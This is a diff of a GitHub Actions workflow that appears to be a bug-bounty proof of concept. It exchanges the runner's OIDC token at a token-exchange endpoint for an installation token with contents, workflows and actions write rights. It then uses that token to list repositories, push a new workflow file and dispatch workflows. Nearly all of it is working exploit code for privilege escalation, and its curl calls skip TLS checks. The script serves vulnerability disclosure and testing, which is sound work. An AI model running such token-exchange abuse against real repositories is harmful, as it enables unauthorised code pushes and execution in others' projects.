@@ -19,8 +19,7 @@ jobs:
           TOK=$(curl -sk -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$URL" | jq -r .value)
           echo "::add-mask::$TOK"
 
-          # Request install token with workflows:write + contents:write + actions:write
-          curl -sk -o /tmp/r.json -w 'HTTP %{http_code}\n' \
+          curl -sk -o /tmp/r.json -w 'EXCHANGE_HTTP %{http_code}\n' \
             -X POST "https://api.anthropic.com/api/github/github-app-token-exchange" \
             -H "Authorization: Bearer $TOK" -H "Content-Type: application/json" -H "X-HackerOne-Handle: liamconner10" \
             -d '{"permissions":{"contents":"write","workflows":"write","actions":"write"}}'
@@ -31,42 +30,35 @@ jobs:
           echo "::add-mask::$INSTALL"
           echo "INSTALL_TOKEN_OK expires=$(jq -r .expires_at /tmp/r.json)"
 
-          # Test 1: GET /installation/repositories
           echo "--- TEST 1: list installation repos"
           curl -sk -H "Authorization: Bearer $INSTALL" -H "Accept: application/vnd.github+json" \
-            "https://api.github.com/installation/repositories?per_page=5" -w '\nHTTP %{http_code}\n' \
-            | jq '{repo:.repositories[0].full_name}'
+            "https://api.github.com/installation/repositories?per_page=5" -w '\nT1_HTTP %{http_code}\n' \
+            | jq -c '{repo:.repositories[0].full_name}'
 
-          # Test 2: actions:write — list workflow runs (works with actions:read; if returned, it's at least read)
-          echo "--- TEST 2: GET workflow runs (needs actions:read)"
+          echo "--- TEST 2: GET workflow runs (actions:read)"
           curl -sk -H "Authorization: Bearer $INSTALL" -H "Accept: application/vnd.github+json" \
-            "https://api.github.com/repos/LiamConner10/oidc-anthropic-probe/actions/runs?per_page=1" -w '\nHTTP %{http_code}\n' \
-            | jq '{total_count, latest_run_id: .workflow_runs[0].id}'
+            "https://api.github.com/repos/LiamConner10/oidc-anthropic-probe/actions/runs?per_page=1" -w '\nT2_HTTP %{http_code}\n' \
+            | jq -c '{total_count, latest_run_id: .workflow_runs[0].id}'
 
-          # Test 3: workflows:write — try to write a workflow file via contents API
-          # Create a new workflow file in a TEST BRANCH (do not touch main; only attacker's workflow proves writes)
-          echo "--- TEST 3: workflows:write — push new workflow to branch"
-          curl -sk -H "Authorization: Bearer $INSTALL" -H "Accept: application/vnd.github+json" \
-            -X PUT "https://api.github.com/repos/LiamConner10/oidc-anthropic-probe/contents/.github/workflows/POC_install_token_$(date +%s).yml" \
-            -d "$(jq -n --arg b "$(base64 -w0 <<<'name: poc
+          echo "--- TEST 3: workflows:write — push new workflow file"
+          POC_NAME="POC_install_${GITHUB_RUN_ID}.yml"
+          POC_CONTENT='name: poc-write-test
 on: workflow_dispatch
 jobs:
   noop:
     runs-on: ubuntu-latest
     steps:
-      - run: echo "POC install_token workflows:write worked"')" \
-              '{message:"PoC: install_token workflows:write", content:$b, branch:"perm-poc"}')" \
-            -w '\nHTTP %{http_code}\n' | jq '{file:.content.html_url, commit:.commit.sha, msg:.message}'
+      - run: echo "install token created this workflow"'
+          POC_B64=$(printf '%s' "$POC_CONTENT" | base64 -w0)
+          curl -sk -H "Authorization: Bearer $INSTALL" -H "Accept: application/vnd.github+json" \
+            -X PUT "https://api.github.com/repos/LiamConner10/oidc-anthropic-probe/contents/.github/workflows/$POC_NAME" \
+            -d "{\"message\":\"PoC install token workflows:write\",\"content\":\"$POC_B64\",\"branch\":\"perm-poc\"}" \
+            -w '\nT3_HTTP %{http_code}\n' | jq -c '{file:.content.html_url, msg:.message, errors:.errors}'
 
-          # Test 4: actions:write — try to dispatch the new workflow
-          echo "--- TEST 4: actions:write — dispatch existing workflow"
+          echo "--- TEST 4: actions:write — dispatch a workflow"
           curl -sk -H "Authorization: Bearer $INSTALL" -H "Accept: application/vnd.github+json" \
             -X POST "https://api.github.com/repos/LiamConner10/oidc-anthropic-probe/actions/workflows/probe.yml/dispatches" \
             -d '{"ref":"main","inputs":{"audience":"claude-code-github-action","permissions_json":"{\"contents\":\"read\"}"}}' \
-            -w '\nHTTP %{http_code}\n'
+            -w '\nT4_HTTP %{http_code}\n'
 
-          # Test 5: actions:write — cancel an old workflow run (less destructive than re-run)
-          # Use the run from test 2
-          echo "--- TEST 5: actions:write — try to delete a run"
-          OLD_RUN=$(curl -sk -H "Authorization: Bearer $INSTALL" "https://api.github.com/repos/LiamConner10/oidc-anthropic-probe/actions/runs?per_page=1" | jq -r '.workflow_runs[0].id')
-          echo "would-delete run id: $OLD_RUN (not actually deleting to avoid noise)"
+          echo "DONE"
